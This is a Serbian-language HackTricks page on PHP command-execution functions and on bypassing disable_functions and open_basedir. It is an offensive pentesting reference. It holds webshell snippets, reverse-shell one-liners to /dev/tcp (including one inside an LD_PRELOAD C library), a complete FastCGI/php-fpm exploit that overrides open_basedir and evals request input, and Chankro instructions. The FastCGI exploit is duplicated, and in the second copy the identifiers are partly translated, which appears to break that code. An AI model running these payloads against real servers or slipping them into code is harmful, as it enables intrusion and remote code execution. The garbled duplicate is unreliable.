# PHP - Useful Functions & disable\_functions/open\_basedir bypass

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## PHP Komanda i Izvr코avanje Koda

### PHP Izvr코avanje Komande

**Napomena:** [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) php webshell mo쬰 **automatski** proveriti i zaobi캖i slede캖e funkcije ako su neke od njih onemogu캖ene.

**exec** - Vra캖a poslednju liniju izlaza komande

```bash
echo exec("uname  -a");
```

**passthru** - Prosle캠uje izlaz komandi direktno u pregleda캜

```php
<?php
passthru($_GET['cmd']);
?>
```

This function allows an attacker to execute arbitrary commands on the server and display the output directly in the browser. It is commonly used to perform command injection attacks. By manipulating the `cmd` parameter in the URL, an attacker can execute any command they want on the server. This can lead to unauthorized access, data leakage, and other security vulnerabilities. It is important to sanitize user input and validate the commands being executed to prevent this type of attack.

```bash
echo passthru("uname -a");
```

**system** - Prosle캠uje izlaz komandi direktno u pregleda캜 i vra캖a poslednju liniju

```bash
echo system("uname -a");
```

**shell\_exec** - Vra캖a izlaz komandi

```bash
echo shell_exec("uname -a");
```

\`\` (backticks) - Isto kao i shell\_exec()

```bash
echo `uname -a`
```

**popen** - Otvora 캜itanje ili pisanje cevi ka procesu komande

```bash
echo fread(popen("/bin/ls /", "r"), 4096);
```

**proc\_open** - Sli캜no kao popen(), ali sa ve캖im stepenom kontrole

```bash
proc_close(proc_open("uname -a",array(),$something));
```

**preg\_replace**

**preg\_replace** je funkcija u PHP-u koja se koristi za zamenu uzoraka u nizu ili stringu. Ova funkcija koristi regularne izraze za pronala쬰nje i zamenu odre캠enih delova teksta.

Evo sintakse funkcije:

```php
preg_replace($pattern, $replacement, $subject);
```

* `$pattern` predstavlja regularni izraz koji se koristi za pronala쬰nje dela teksta koji 쬰limo da zamenimo.
* `$replacement` predstavlja string ili niz koji se koristi za zamenu prona캠enog dela teksta.
* `$subject` predstavlja niz ili string u kojem 쬰limo da izvr코imo zamenu.

Ova funkcija je veoma korisna prilikom manipulacije tekstom, kao i prilikom obrade korisni캜kog unosa. Me캠utim, treba biti oprezan prilikom kori코캖enja ove funkcije, jer nepravilno kori코캖enje mo쬰 dovesti do ranjivosti kao 코to su XSS napadi ili SQL injection.

Uvek treba proveriti i validirati korisni캜ki unos pre nego 코to se koristi **preg\_replace** funkcija kako bi se spre캜ile potencijalne ranjivosti.

```php
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```

**pcntl\_exec** - Izvr코ava program (podrazumevano u modernoj i ne tako modernoj PHP verziji, morate u캜itati modul `pcntl.so` da biste koristili ovu funkciju)

```bash
pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]);
```

**mail / mb\_send\_mail** - Ova funkcija se koristi za slanje mejlova, ali se mo쬰 zloupotrebiti kako bi se ubacili proizvoljni komandi unutar parametra `$options`. Ovo je zato 코to **php `mail` funkcija** obi캜no poziva `sendmail` binarni fajl unutar sistema i omogu캖ava vam da **dodate dodatne opcije**. Me캠utim, ne캖ete mo캖i videti izlaz izvr코ene komande, pa se preporu캜uje da kreirate skriptu koja upisuje izlaz u fajl, izvr코ite je koriste캖i mail, i ispi코ete izlaz:

```bash
file_put_contents('/www/readflag.sh', base64_decode('IyEvYmluL3NoCi9yZWFkZmxhZyA+IC90bXAvZmxhZy50eHQKCg==')); chmod('/www/readflag.sh', 0777);  mail('', '', '', '', '-H \"exec /www/readflag.sh\"'); echo file_get_contents('/tmp/flag.txt');
```

**dl** - Ova funkcija se mo쬰 koristiti za dinami캜ko u캜itavanje PHP ekstenzije. Ova funkcija ne캖e uvek biti prisutna, pa trebate proveriti da li je dostupna pre nego 코to poku코ate da je iskoristite. Pro캜itajte [ovu stranicu da biste nau캜ili kako iskoristiti ovu funkciju](disable\_functions-bypass-dl-function.md).

### Izvr코avanje PHP koda

Osim eval funkcije, postoje i druge metode za izvr코avanje PHP koda: include/require se mogu koristiti za izvr코avanje udaljenog PHP koda u obliku ranjivosti lokalnog uklju캜ivanja fajlova i udaljenog uklju캜ivanja fajlova.

```php
${<php code>}              // If your input gets reflected in any PHP string, it will be executed.
eval()
assert()                   //  identical to eval()
preg_replace('/.*/e',...)  // e does an eval() on the match
create_function()          // Create a function and use eval()
include()
include_once()
require()
require_once()
$_GET['func_name']($_GET['argument']);

$func = new ReflectionFunction($_GET['func_name']);
$func->invoke();
// or
$func->invokeArgs(array());

// or serialize/unserialize function
```

## disable\_functions & open\_basedir

**Onemogu캖ene funkcije** su pode코avanje koje se mo쬰 konfigurisati u `.ini` fajlovima u PHP-u i koje 캖e **zabraniti** kori코캖enje navedenih **funkcija**. **Open basedir** je pode코avanje koje PHP-u pokazuje folder na koji mo쬰 pristupiti.\
PHP pode코avanje se obi캜no konfiguri코e u putanji _/etc/php7/conf.d_ ili sli캜noj.

Oba pode코avanja se mogu videti u izlazu **`phpinfo()`**:

![](https://0xrick.github.io/images/hackthebox/kryptos/17.png)

![](<../../../../.gitbook/assets/image (347).png>)

## open\_basedir Bypass

`open_basedir` 캖e konfigurisati foldere na koje PHP mo쬰 pristupiti, ne캖ete mo캖i da pi코ete/캜itate/izvr코avate bilo koji fajl van tih foldera, ali tako캠e ne캖ete mo캖i ni da **izlistate** druge direktorijume.\
Me캠utim, ako nekako uspete da izvr코ite proizvoljni PHP kod, mo쬰te **poku코ati** slede캖i deo **koda** da biste poku코ali da **zaobi캠ete** ograni캜enje.

### Izlistavanje direktorijuma sa glob:// zaobila쬰njem

U ovom prvom primeru koristi se `glob://` protokol sa nekim zaobila쬰njem putanje:

```php
<?php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
$it = new DirectoryIterator("glob:///v??/run/.*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
sort($file_list);
foreach($file_list as $f){
echo "{$f}<br/>";
}
```

**Napomena1**: U putanji mo쬰te koristiti i `/e??/*` da biste naveli `/etc/*` i bilo koji drugi folder.\
**Napomena2**: Izgleda da je deo koda dupliciran, ali to je zapravo neophodno!\
**Napomena3**: Ovaj primer je koristan samo za listanje foldera, a ne za 캜itanje fajlova

### Potpuno zaobila쬰nje open\_basedir pomo캖u zloupotrebe FastCGI

Ako 쬰lite **saznati vi코e o PHP-FPM i FastCGI** mo쬰te pro캜itati [prvi deo ove stranice](disable\_functions-bypass-php-fpm-fastcgi.md).\
Ako je **`php-fpm`** konfigurisan, mo쬰te ga zloupotrebiti da potpuno zaobi캠ete **open\_basedir**:

![](<../../../../.gitbook/assets/image (350).png>)

![](<../../../../.gitbook/assets/image (349).png>)

Napomena da prva stvar koju trebate uraditi je da prona캠ete gde se nalazi **unix socket php-fpm-a**. Obi캜no se nalazi u `/var/run`, pa mo쬰te **koristiti prethodni kod da biste izlistali direktorijum i prona코li ga**.\
Kod preuzet [ovde](https://balsn.tw/ctf\_writeup/20190323-0ctf\_tctf2019quals/#wallbreaker-easy).

````php
<?php
/**
* Note : Code is released under the GNU LGPL
*
* Please do not change the header of this file
*
* This library is free software; you can redistribute it and/or modify it under the terms of the GNU
* Lesser General Public License as published by the Free Software Foundation; either version 2 of
* the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*
* See the GNU Lesser General Public License for more details.
*/
/**
* Handles communication with a FastCGI application
*
* @author      Pierrick Charron <pierrick@webstart.fr>
* @version     1.0
*/
class FCGIClient
{
const VERSION_1            = 1;
const BEGIN_REQUEST        = 1;
const ABORT_REQUEST        = 2;
const END_REQUEST          = 3;
const PARAMS               = 4;
const STDIN                = 5;
const STDOUT               = 6;
const STDERR               = 7;
const DATA                 = 8;
const GET_VALUES           = 9;
const GET_VALUES_RESULT    = 10;
const UNKNOWN_TYPE         = 11;
const MAXTYPE              = self::UNKNOWN_TYPE;
const RESPONDER            = 1;
const AUTHORIZER           = 2;
const FILTER               = 3;
const REQUEST_COMPLETE     = 0;
const CANT_MPX_CONN        = 1;
const OVERLOADED           = 2;
const UNKNOWN_ROLE         = 3;
const MAX_CONNS            = 'MAX_CONNS';
const MAX_REQS             = 'MAX_REQS';
const MPXS_CONNS           = 'MPXS_CONNS';
const HEADER_LEN           = 8;
/**
* Socket
* @var Resource
*/
private $_sock = null;
/**
* Host
* @var String
*/
private $_host = null;
/**
* Port
* @var Integer
*/
private $_port = null;
/**
* Keep Alive
* @var Boolean
*/
private $_keepAlive = false;
/**
* Constructor
*
* @param String $host Host of the FastCGI application
* @param Integer $port Port of the FastCGI application
*/
public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
{
$this->_host = $host;
$this->_port = $port;
}
/**
* Define whether or not the FastCGI application should keep the connection
* alive at the end of a request
*
* @param Boolean $b true if the connection should stay alive, false otherwise
*/
public function setKeepAlive($b)
{
$this->_keepAlive = (boolean)$b;
if (!$this->_keepAlive && $this->_sock) {
fclose($this->_sock);
}
}
/**
* Get the keep alive status
*
* @return Boolean true if the connection should stay alive, false otherwise
*/
public function getKeepAlive()
{
return $this->_keepAlive;
}
/**
* Create a connection to the FastCGI application
*/
private function connect()
{
if (!$this->_sock) {
//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
$this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
if (!$this->_sock) {
throw new Exception('Unable to connect to FastCGI application');
}
}
}
/**
* Build a FastCGI packet
*
* @param Integer $type Type of the packet
* @param String $content Content of the packet
* @param Integer $requestId RequestId
*/
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1)         /* version */
. chr($type)                    /* type */
. chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
. chr($requestId & 0xFF)        /* requestIdB0 */
. chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
. chr($clen & 0xFF)             /* contentLengthB0 */
. chr(0)                        /* paddingLength */
. chr(0)                        /* reserved */
. $content;                     /* content */
}
/**
* Build an FastCGI Name value pair
*
* @param String $name Name
* @param String $value Value
* @return String FastCGI Name value pair
*/
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen < 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
$nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
}
if ($vlen < 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
$nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
}
/* nameData & valueData */
return $nvpair . $name . $value;
}
/**
* Read a set of FastCGI Name value pairs
*
* @param String $data Data containing the set of FastCGI NVPair
* @return array of NVPair
*/
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data{$p++});
if ($nlen >= 128) {
$nlen = ($nlen & 0x7F << 24);
$nlen |= (ord($data{$p++}) << 16);
$nlen |= (ord($data{$p++}) << 8);
$nlen |= (ord($data{$p++}));
}
$vlen = ord($data{$p++});
if ($vlen >= 128) {
$vlen = ($nlen & 0x7F << 24);
$vlen |= (ord($data{$p++}) << 16);
$vlen |= (ord($data{$p++}) << 8);
$vlen |= (ord($data{$p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
/**
* Decode a FastCGI Packet
*
* @param String $data String containing all the packet
* @return array
*/
private function decodePacketHeader($data)
{
$ret = array();
$ret['version']       = ord($data{0});
$ret['type']          = ord($data{1});
$ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
$ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
$ret['paddingLength'] = ord($data{6});
$ret['reserved']      = ord($data{7});
return $ret;
}
/**
* Read a FastCGI Packet
*
* @return array
*/
private function readPacket()
{
if ($packet = fread($this->_sock, self::HEADER_LEN)) {
$resp = $this->decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len  = $resp['contentLength'];
while ($len && $buf=fread($this->_sock, $len)) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf=fread($this->_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
/**
* Get Informations on the FastCGI application
*
* @param array $requestedInfo information to retrieve
* @return array
*/
public function getValues(array $requestedInfo)
{
$this->connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this->buildNvpair($info, '');
}
fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
$resp = $this->readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this->readNvpair($resp['content'], $resp['length']);
} else {
throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
/**
* Execute a request to the FastCGI application
*
* @param array $params Array of parameters
* @param String $stdin Content
```php
* @return String
*/
public function request(array $params, $stdin)
{
$response = '';
$this->connect();
$request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsRequest = '';
foreach ($params as $key => $value) {
$paramsRequest .= $this->buildNvpair($key, $value);
}
if ($paramsRequest) {
$request .= $this->buildPacket(self::PARAMS, $paramsRequest);
}
$request .= $this->buildPacket(self::PARAMS, '');
if ($stdin) {
$request .= $this->buildPacket(self::STDIN, $stdin);
}
$request .= $this->buildPacket(self::STDIN, '');
fwrite($this->_sock, $request);
do {
$resp = $this->readPacket();
if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
$response .= $resp['content'];
}
} while ($resp && $resp['type'] != self::END_REQUEST);
var_dump($resp);
if (!is_array($resp)) {
throw new Exception('Bad request');
}
switch (ord($resp['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('New request rejected; too busy [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Role value not known [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?>
<?php
// real exploit start here
if (!isset($_REQUEST['cmd'])) {
die("Check your input\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // php payload -- Doesnt do anything
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->request($params, $code)."\n";
?>
````

```php
* @return String
*/
public function zahtev(array $params, $stdin)
{
$response = '';
$this->povezi();
$zahtev = $this->napraviPaket(self::POCETAK_ZAHTEVA, chr(0) . chr(self::ODGOVARAC) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsZahtev = '';
foreach ($params as $kljuc => $vrednost) {
$paramsZahtev .= $this->napraviNvpar($kljuc, $vrednost);
}
if ($paramsZahtev) {
$zahtev .= $this->napraviPaket(self::PARAMETRI, $paramsZahtev);
}
$zahtev .= $this->napraviPaket(self::PARAMETRI, '');
if ($stdin) {
$zahtev .= $this->napraviPaket(self::STANDARDNI_UNOS, $stdin);
}
$zahtev .= $this->napraviPaket(self::STANDARDNI_UNOS, '');
fwrite($this->_sock, $zahtev);
do {
$odgovor = $this->procitajPaket();
if ($odgovor['tip'] == self::STANDARDNI_IZLAZ || $odgovor['tip'] == self::STANDARDNA_GRESKA) {
$response .= $odgovor['sadrzaj'];
}
} while ($odgovor && $odgovor['tip'] != self::KRAJ_ZAHTEVA);
var_dump($odgovor);
if (!is_array($odgovor)) {
throw new Exception('Lo코 zahtev');
}
switch (ord($odgovor['sadrzaj']{4})) {
case self::NE_MOZE_MPX_CONN:
throw new Exception('Ova aplikacija ne mo쬰 da multiplexuje [NE_MOZE_MPX_CONN]');
break;
case self::PREOPTERE캕ENO:
throw new Exception('Novi zahtev odbijen; previ코e zauzeto [PREOPTERE캕ENO]');
break;
case self::NEPOZNATA_ULOGA:
throw new Exception('Vrednost uloge nije poznata [NEPOZNATA_ULOGA]');
break;
case self::ZAHTJEV_ZAVREN:
return $response;
}
}
}
?>
<?php
// pravi eksploatacija po캜inje ovde
if (!isset($_REQUEST['cmd'])) {
die("Proverite unos\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // php payload -- Ne radi ni코ta
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->zahtev($params, $code)."\n";
?>
```

Ovi skriptovi 캖e komunicirati sa **unix socket-om php-fpm**-a (obi캜no sme코tenim u /var/run ako se koristi fpm) kako bi izvr코ili proizvoljni kod. Pode코avanja `open_basedir` 캖e biti prebrisana atributom **PHP\_VALUE** koji se 코alje.\
Primetite kako se koristi `eval` da bi se izvr코io PHP kod koji 코aljete unutar parametra **cmd**.\
Tako캠e, primetite **komentarisani red 324**, mo쬰te ga odkomentarisati i **payload 캖e automatski se povezati sa datom URL-om i izvr코iti sadr쬬ni PHP kod**.\
Jednostavno pristupite `http://vulnerable.com:1337/l.php?cmd=echo file_get_contents('/etc/passwd');` da biste dobili sadr쬬j datoteke `/etc/passwd`.

{% hint style="warning" %}
Mo쬯a mislite da na isti na캜in na koji smo prebrisali konfiguraciju `open_basedir` mo쬰mo **prebrisati `disable_functions`**. Pa, poku코ajte, ali ne캖e uspeti, izgleda da **`disable_functions` mo쬰 biti konfigurisan samo u `.ini` php** konfiguracionoj datoteci i promene koje vr코ite koriste캖i PHP\_VALUE ne캖e biti efektivne na ovoj specifi캜noj postavci.
{% endhint %}

## Bypass disable\_functions

Ako uspete da izvr코ite PHP kod unutar ma코ine, verovatno 쬰lite da pre캠ete na slede캖i nivo i **izvr코ite proizvoljne sistemsko naredbe**. U ovoj situaciji je uobi캜ajeno otkriti da su ve캖ina ili sve PHP **funkcije** koje omogu캖avaju **izvr코avanje sistemskih naredbi onemogu캖ene** u **`disable_functions`.**\
Pogledajmo kako mo쬰te zaobi캖i ovu restrikciju (ako mo쬰te)

### Automatsko otkrivanje zaobila쬰nja

Mo쬰te koristiti alat [https://github.com/teambi0s/dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser) i on 캖e vam pokazati koju funkciju (ako postoji) mo쬰te koristiti za **zaobila쬰nje** **`disable_functions`**.

### Zaobila쬰nje kori코캖enjem drugih sistemskih funkcija

Vratite se na po캜etak ove stranice i **proverite da li je neka od funkcija za izvr코avanje naredbi onemogu캖ena i dostupna u okru쬰nju**. Ako prona캠ete barem jednu od njih, mo캖i 캖ete je koristiti za izvr코avanje proizvoljnih sistemskih naredbi.

### LD\_PRELOAD zaobila쬰nje

Dobro je poznato da neke funkcije u PHP-u poput `mail()` 캖e **izvr코avati binarne datoteke unutar sistema**. Stoga, mo쬰te ih zloupotrebiti koriste캖i promenljivu okru쬰nja `LD_PRELOAD` da bi se u캜itao proizvoljni biblioteka koja mo쬰 izvr코iti bilo 코ta.

#### Funkcije koje se mogu koristiti za zaobila쬰nje disable\_functions sa LD\_PRELOAD

* **`mail`**
* **`mb_send_mail`**: Efektivno kada je instaliran modul `php-mbstring`.
* **`imap_mail`**: Radi ako je prisutan modul `php-imap`.
* **`libvirt_connect`**: Zahteva modul `php-libvirt-php`.
* **`gnupg_init`**: Mo쬰 se koristiti sa instaliranim modulom `php-gnupg`.
* **`new imagick()`**: Ova klasa mo쬰 biti zloupotrebljena za zaobila쬰nje restrikcija. Detaljne tehnike eksploatacije mogu se prona캖i u sveobuhvatnom [**izve코taju ovde**](https://blog.bi0s.in/2019/10/23/Web/BSidesDelhi19-evalme/).

Mo쬰te [**ovde prona캖i**](https://github.com/tarunkant/fuzzphunc/blob/master/lazyFuzzer.py) skriptu za ispitivanje koja je kori코캖ena za pronala쬰nje ovih funkcija.

Ovde je biblioteka koju mo쬰te kompajlirati da biste zloupotrebili promenljivu okru쬰nja `LD_PRELOAD`:

```php
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>

uid_t getuid(void){
unsetenv("LD_PRELOAD");
system("bash -c \"sh -i >& /dev/tcp/127.0.0.1/1234 0>&1\"");
return 1;
}
```

#### Bypass kori코캖enjem Chankro-a

Da biste iskoristili ovu konfiguraciju, mo쬰te koristiti [**Chankro**](https://github.com/TarlogicSecurity/Chankro). Ovo je alat koji 캖e **generisati PHP eksploit** koji trebate otpremiti na ranjivi server i izvr코iti ga (pristupiti mu putem veba).\
**Chankro** 캖e upisati unutar diska rtve **biblioteku i obrnutu ljusku** koju 쬰lite izvr코iti i koristi캖e trik\*\*`LD_PRELOAD` + PHP `mail()`\*\* funkciju da izvr코i obrnutu ljusku.

Imajte na umu da da biste koristili **Chankro**, `mail` i `putenv` **ne smeju se pojaviti unutar liste `disable_functions`**.\
U slede캖em primeru mo쬰te videti kako **kreirati Chankro eksploit** za **arch 64**, koji 캖e izvr코iti `whoami` i sa캜uvati izlaz u _/tmp/chankro\_shell.out_, Chankro 캖e **upisati biblioteku i payload** u _/tmp_ i **kona캜ni eksploit** 캖e se zvati **bicho.php** (to je datoteka koju trebate otpremiti na server rtve):

{% tabs %}
{% tab title="shell.sh" %}
```php
#!/bin/sh
whoami > /tmp/chankro_shell.out
```
{% endtab %}

{% tab title="Chankro" %}
```bash
python2 chankro.py --arch 64 --input shell.sh --path /tmp --output bicho.php
```
{% endtab %}
{% endtabs %}

Ako primetite da je funkcija **mail** blokirana onemogu캖enim funkcijama, mo쬯a i dalje mo쬰te koristiti funkciju **mb\_send\_mail**.\
Vi코e informacija o ovoj tehnici i Chankro-u mo쬰te prona캖i ovde: [https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/](https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/)

### "Bypass" kori코캖enjem PHP mogu캖nosti

Imajte na umu da pomo캖u **PHP**-a mo쬰te **캜itati i pisati datoteke, kreirati direktorijume i menjati dozvole**.\
캛ak mo쬰te i **izbaciti baze podataka**.\
Mo쬯a pomo캖u **PHP**-a mo쬰te **izlistati** sistem i prona캖i na캜in za eskalaciju privilegija/izvr코avanje komandi (na primer, 캜itanje nekog privatnog SSH klju캜a).

Kreirao sam webshell koji olak코ava izvo캠enje ovih radnji (imajte na umu da 캖e vam ve캖ina webshellova tako캠e ponuditi ove opcije): [https://github.com/carlospolop/phpwebshelllimited](https://github.com/carlospolop/phpwebshelllimited)

### Bypass metode zavisne od modula/verzije

Postoji nekoliko na캜ina zaobila쬰nja disable\_functions ako se koristi odre캠eni modul ili iskori코캖ava odre캠ena verzija PHP-a:

* [**FastCGI/PHP-FPM (FastCGI Process Manager)**](disable\_functions-bypass-php-fpm-fastcgi.md)
* [**Bypass sa FFI - Foreign Function Interface omogu캖en**](https://github.com/carlospolop/hacktricks/blob/rs/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable\_functions-open\_basedir-bypass/broken-reference/README.md)
* [**Bypass putem mem**](disable\_functions-bypass-via-mem.md)
* [**mod\_cgi**](disable\_functions-bypass-mod\_cgi.md)
* [**PHP Perl Extension Safe\_mode**](disable\_functions-bypass-php-perl-extension-safe\_mode-bypass-exploit.md)
* [**dl funkcija**](disable\_functions-bypass-dl-function.md)
* [**Ovaj exploit**](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass)
* 5.\* - iskoristiv sa manjim izmenama u PoC-u
* 7.0 - sve verzije do danas
* 7.1 - sve verzije do danas
* 7.2 - sve verzije do danas
* 7.3 - sve verzije do danas
* 7.4 - sve verzije do danas
* 8.0 - sve verzije do danas
* [**Od 7.0 do 8.0 exploit (samo za Unix)**](https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php)
* [**PHP 7.0=7.4 (\*nix)**](disable\_functions-bypass-php-7.0-7.4-nix-only.md#php-7-0-7-4-nix-only)
* [**Imagick 3.3.0 PHP >= 5.4**](disable\_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md)
* [**PHP 5.x Shellsock**](disable\_functions-php-5.x-shellshock-exploit.md)
* [**PHP 5.2.4 ionCube**](disable\_functions-php-5.2.4-ioncube-extension-exploit.md)
* [**PHP <= 5.2.9 Windows**](disable\_functions-bypass-php-less-than-5.2.9-on-windows.md)
* [**PHP 5.2.4/5.2.5 cURL**](disable\_functions-bypass-php-5.2.4-and-5.2.5-php-curl.md)
* [**PHP 5.2.3 -Win32std**](disable\_functions-bypass-php-5.2.3-win32std-ext-protections-bypass.md)
* [**PHP 5.2 FOpen exploit**](disable\_functions-bypass-php-5.2-fopen-exploit.md)
* [**PHP 4 >= 4.2.-, PHP 5 pcntl\_exec**](disable\_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl\_exec.md)

### **Automatski alat**

Slede캖i skript poku코ava neke od ovde komentarisanih metoda:\
[https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php](https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php)

## Ostale zanimljive PHP funkcije

### Lista funkcija koje prihvataju povratne pozive

Ove funkcije prihvataju string parametar koji se mo쬰 koristiti za pozivanje funkcije po izboru napada캜a. Zavisno od funkcije, napada캜 mo쬰 ili ne mora imati mogu캖nost prosle캠ivanja parametra. U tom slu캜aju, funkcija za otkrivanje informacija poput phpinfo() mo쬰 se koristiti.

[Povratni pozivi / Callable](https://www.php.net/manual/en/language.types.callable.php)

[Slede캖e liste odavde](https://stackoverflow.com/questions/3115559/exploitable-php-functions)

```php
// Function => Position of callback arguments
'ob_start' => 0,
'array_diff_uassoc' => -1,
'array_diff_ukey' => -1,
'array_filter' => 1,
'array_intersect_uassoc' => -1,
'array_intersect_ukey' => -1,
'array_map' => 0,
'array_reduce' => 1,
'array_udiff_assoc' => -1,
'array_udiff_uassoc' => array(-1, -2),
'array_udiff' => -1,
'array_uintersect_assoc' => -1,
'array_uintersect_uassoc' => array(-1, -2),
'array_uintersect' => -1,
'array_walk_recursive' => 1,
'array_walk' => 1,
'assert_options' => 1,
'uasort' => 1,
